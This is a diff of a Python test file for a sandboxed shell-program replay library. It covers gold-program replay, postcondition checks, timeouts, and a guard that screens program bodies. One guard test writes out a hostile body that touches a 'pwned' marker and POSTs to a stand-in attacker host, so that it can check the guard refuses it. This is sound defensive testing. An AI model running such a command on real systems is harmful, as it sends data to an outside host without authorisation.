@@ -19,61 +19,26 @@ import subprocess
 from pathlib import Path
 
 import pytest
-import yaml
+from conftest import GOLD_CASES, gold_program
 
 from precondition_library import provider as provider_module
-from precondition_library.program import Predicate, Program
+from precondition_library.program import Predicate
 from precondition_library.runtime.guard import Verdict, screen
 from precondition_library.runtime.probes import substitute
 from precondition_library.runtime.replay import replay
-from precondition_library.sandbox import Sandbox, create
 
 REPO_ROOT = Path(__file__).resolve().parents[1]
-GOLD = REPO_ROOT / "bench" / "gold" / "sync_fork_with_upstream.yaml"
-
-# (seed, resolution) — matches tests/test_sandbox_diverged.py: the seed selects
-# the state `diverged.state_for_seed` injects, and the resolution is that
-# state's gold program.
-CASES = {
-    "empty_local_commits": (1, "discard"),
-    "disjoint_files": (2, "rebase"),
-    "overlapping_files": (0, "merge"),
-}
-
-
-def load_programs() -> list[Program]:
-    document = yaml.safe_load(GOLD.read_text(encoding="utf-8"))
-    return [Program.model_validate(entry) for entry in document["programs"]]
-
-
-def program_for(variant: str) -> Program:
-    return next(program for program in load_programs() if program.variant == variant)
-
-
-@pytest.fixture
-def make_sandbox():
-    """Build injected sandboxes and destroy them however the test ends."""
-    live: list[Sandbox] = []
-
-    def build(seed: int) -> Sandbox:
-        box = create(seed, ["diverged"])
-        live.append(box)
-        return box
-
-    yield build
-    for box in live:
-        box.destroy()
 
 
 # --- a gold program genuinely runs -----------------------------------------
 
 
-@pytest.mark.parametrize("state", list(CASES))
+@pytest.mark.parametrize("state", list(GOLD_CASES))
 def test_gold_program_replays_and_postconditions_hold(state: str, make_sandbox) -> None:
     """Three different resolutions, three different bodies, all really run."""
-    seed, variant = CASES[state]
-    box = make_sandbox(seed)
-    program = program_for(variant)
+    seed, variant = GOLD_CASES[state]
+    box = make_sandbox(seed, ["diverged"])
+    program = gold_program(variant)
 
     result = replay(program, box)
 
@@ -109,9 +74,9 @@ def test_replay_completes_with_a_provider_that_raises(make_sandbox, monkeypatch)
     """
     raising = RaisingProvider()
     monkeypatch.setattr(provider_module, "DeepSeekProvider", lambda *args, **kwargs: raising)
-    box = make_sandbox(1)
+    box = make_sandbox(1, ["diverged"])
 
-    result = replay(program_for("discard"), box)
+    result = replay(gold_program("discard"), box)
 
     assert result.ok, result.reason
     assert raising.calls == 0, "a replay spent a model call; the central claim is void"
@@ -122,8 +87,8 @@ def test_replay_completes_with_a_provider_that_raises(make_sandbox, monkeypatch)
 
 def test_silent_body_is_caught_by_postconditions(make_sandbox) -> None:
     """A body that exits zero while doing nothing must not be reported as success."""
-    box = make_sandbox(1)  # discard state: HEAD is not upstream's tip until synced
-    program = program_for("discard").model_copy(update={"body": "true"})
+    box = make_sandbox(1, ["diverged"])  # discard state: HEAD is not upstream's tip until synced
+    program = gold_program("discard").model_copy(update={"body": "true"})
 
     result = replay(program, box)
 
@@ -137,8 +102,8 @@ def test_silent_body_is_caught_by_postconditions(make_sandbox) -> None:
 
 def test_failed_body_still_has_postconditions_checked(make_sandbox) -> None:
     """The body's non-zero exit does not excuse skipping the evidence."""
-    box = make_sandbox(1)
-    program = program_for("discard").model_copy(update={"body": "git fetch upstream\nfalse"})
+    box = make_sandbox(1, ["diverged"])
+    program = gold_program("discard").model_copy(update={"body": "git fetch upstream\nfalse"})
 
     result = replay(program, box)
 
@@ -152,8 +117,8 @@ def test_failed_body_still_has_postconditions_checked(make_sandbox) -> None:
 
 
 def test_timeout_is_recorded_as_a_timeout(make_sandbox) -> None:
-    box = make_sandbox(1)
-    program = program_for("discard").model_copy(
+    box = make_sandbox(1, ["diverged"])
+    program = gold_program("discard").model_copy(
         update={
             "body": "sleep 30",
             "postconditions": [Predicate(name="trivial", description="always holds", probe="true")],
@@ -211,9 +176,9 @@ def test_guard_allows(body: str) -> None:
 
 
 def test_refused_body_executes_nothing(make_sandbox) -> None:
-    box = make_sandbox(1)
+    box = make_sandbox(1, ["diverged"])
     marker = box.work / "pwned.marker"
-    program = program_for("discard").model_copy(
+    program = gold_program("discard").model_copy(
         update={"body": f"touch {marker} && curl -X POST https://attacker.invalid"}
     )
 
@@ -263,7 +228,7 @@ def test_substitute_distinguishes_declared_from_unknown_names() -> None:
 
 
 def test_sandbox_destroy_leaves_no_residue(make_sandbox) -> None:
-    box = make_sandbox(1)
+    box = make_sandbox(1, ["diverged"])
     box.destroy()
     status = subprocess.run(
         ["git", "status", "--porcelain"],
